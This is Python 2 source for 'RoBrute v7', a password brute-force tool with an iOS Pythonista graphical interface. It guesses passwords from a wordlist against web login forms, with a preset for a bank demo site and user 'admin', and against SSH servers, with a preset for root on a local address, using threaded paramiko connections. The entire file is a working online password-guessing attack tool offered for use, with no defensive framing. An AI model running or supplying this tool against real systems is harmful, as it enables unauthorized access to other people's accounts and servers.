"""
 _____     _____         _
| __  |___| __  |___ _ _| |_ ___ 
|    -| . | __ -|  _| | |  _| -_|
|__|__|___|_____|_| |___|_| |___|v7

RoBrute v7 uses Pythonista's & IOS's UIKit to provide a graphical user interface for RoBrute - Brute Force Program!

Copyright (c) SavSec RoBrute 2017
MIT License
Python 2.7.11

"""

import ui, sys, time, threading, requests
from datetime import timedelta
from paramiko import SSHClient
from paramiko import AutoAddPolicy

if sys.platform != "ios":
	print "RoBrutev7 is only usable on iOS devices"
	sys.exit()

config = """http://demo.testfire.net/bank/login.aspx
uid
passw
Welcome
admin
passes.txt"""

sshconfig = """root
passes.txt
192.168.1.87:2222
0.5"""

def load_config(anything):
	if v["ssh"].value:
		a,b,c,d = sshconfig.split("\n")
		v["user"].text     = a
		v["passfile"].text = b
		v["url"].text      = c
		v["rate"].value    = float(d)
	else:
		a,b,c,d,e,f = config.split("\n")
		v["url"].text     = a
		v["userbox"].text = b
		v["user"].text    = e
		v["passbox"].text = c
		v["passfile"].text = f
		v["lookfor"].text = d

def clear_config(anything):
	a,b,c,d,e,f = ("\n"*5).split("\n")
	v["url"].text     = a
	v["userbox"].text = b
	v["user"].text    = e
	v["passbox"].text = c
	v["passfile"].text = f
	v["lookfor"].text = d

def brute(url,uid,usr,pid,pwd,lkf,rate):
	if "http" not in url:
		url = "http://" + url
	num = sum(1 for line in open(pwd))
	a = 0
	start_time = time.time()
	for pws in open(pwd).readlines():
		pws = pws.replace("\n","")
		values = {uid : usr, pid : pws}
		r = requests.post(url, data=values)
		info = r.content
		a = a + 1
		if lkf in info:
			out_error("\nPassword:\n%s\n"%pws)
			elapsed_time = time.time() - start_time
			print ""
			time.sleep(3)
			times = str(timedelta(seconds=elapsed_time))
			if v["verbose"].value:
				out_error("Time Elapsed:\n"+str(times))
			break

def sshbrute(user,pswrd,ip,port,timeout=2):
	sshConnection = SSHClient()
	sshConnection.set_missing_host_key_policy(AutoAddPolicy())
	try:
		sshConnection.connect(ip, port = int(port), username = user, password = pswrd, timeout = int(timeout), allow_agent = False,look_for_keys = False)
		status = True
		out_error("\nUsername: %s\nPassword: %s" %(user,pswrd))
		sys.exit()
		sshConnection.close()
	except Exception as e:
		print e
		try:
			status = False
		except:
			sys.exit()

def sshb(user,passfile,host,rate,timeout=2):
	ip,port = host.split(":")
	port = int(port)
	f = open(passfile).readlines()
	dm = []
	for p in f:
		t = threading.Thread(target=sshbrute,args=(user,p,ip,port,timeout))
		t.daemon = True
		if p not in dm:
			sys.stderr = t.start()
		time.sleep(rate)
		dm.append(p)

def out_error(error):
	outputs = v["outputs"]["out"]
	if len(outputs.text) > 300:
		outputs.text = ""
	outputs.text += "\n" + str(error)

def missing(name):
	v[name].text = "!"
	globals()["ready"] = False
def found(name):
	v[name].text = ""

def datacheck(Interface):
	view = Interface.superview
	verbose = view["verbose"].value
	user = view["user"].text
	ssh = view["ssh"].value
	passfile = view["passfile"].text
	userbox = view["userbox"].text
	passbox = view["passbox"].text
	success = view["lookfor"].text
	url = view["url"].text
	rate = view["rate"].value
	globals()["ready"] = True
	
	if len(user) <= 0:
		missing("user_check")
	else:
		found("user_check")
	if len(passfile) <= 3:
		missing("passfile_check")
	else:
		found("passfile_check")
	if len(url) <= 8:
		missing("url_check")
	else:
		found("url_check")
	if ssh:
		if not ready:
			out_error("Missing values")
		else:
			try:
				update_stat("Running")
				sshb(user,passfile,url,rate)
				update_stat("Finished")
			except Exception as e:
				out_error(e)
	
	if not ssh:
		if len(userbox) <= 0:
			missing("userbox_check")
		else:
			found("userbox_check")
		if len(passbox) <= 0:
			missing("passbox_check")
		else:
			found("passbox_check")
		if len(success) <= 1:
			missing("lookfor_check")
		else:
			found("lookfor_check")
		if not ready:
			out_error("Missing values")
		else:
			try:
				update_stat("Running")
				brute(url,userbox,user,passbox,passfile,success,rate)
				update_stat("Finished")
			except Exception as e:
				out_error(e)

def update_stat(s):
	stat = v["stat"]
	stat.text = s

def attack_rate(Interface):
	view = Interface.superview
	v["speed"].text = str(v["rate"].value)[:4]

"""	
textlabel = v['textlabel']
textlabel.text = mytext
"""

v = ui.load_view()
v.present('sheet',title_bar_color="#1b1b1b")
v.background_color="#1b1b1b"
v["outputs"].background_color="#1b1b1b"
